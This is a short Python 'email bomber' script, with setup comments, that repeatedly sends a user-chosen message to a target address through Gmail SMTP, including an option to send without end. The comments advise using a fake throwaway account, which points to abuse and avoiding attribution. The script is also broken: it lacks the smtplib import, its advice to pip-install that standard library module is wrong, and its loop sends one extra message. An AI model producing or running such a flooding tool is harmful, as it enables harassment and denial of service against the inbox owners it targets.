 #install python3 if you don't already have it!
#pip3 install smtplib
#create gmail account
#enable third party apps in settings
#if you're unfamiliar with terminal, here's a step by step guide to installing dependencies and running on mac
#first add your desired source email, then save to desktop
#open terminal then follow along
#cd ~/Desktop
#pip3 install smtplib
#python3 bop.py
#DO NOT USE YOUR ACTUAL EMAIL 


def sendmail(target, msg):
	smtpgateway= smtplib.SMTP('smtp.gmail.com', 587)
	smtpgateway.starttls()
	smtpgateway.login("email without @gmail.com", "password")
	smtpgateway.sendmail("email with @gmail.com eg; fakeemail@gmail.com", target, msg)
	print("SENT")
	smtpgateway.quit()
print("Provide a target email address: " + "\n")
tgt = input()
print("Insert a message to send")
message = input()
print("Insert a set number of times to send the message, or use 999 to email indefinitely")
invar = input()
if int(invar) == 999:
	while(True):
		sendmail(tgt, message)
else:
	for x in range(0, int(invar)+1):
		sendmail(tgt, message)
print("Script terminated successfully")
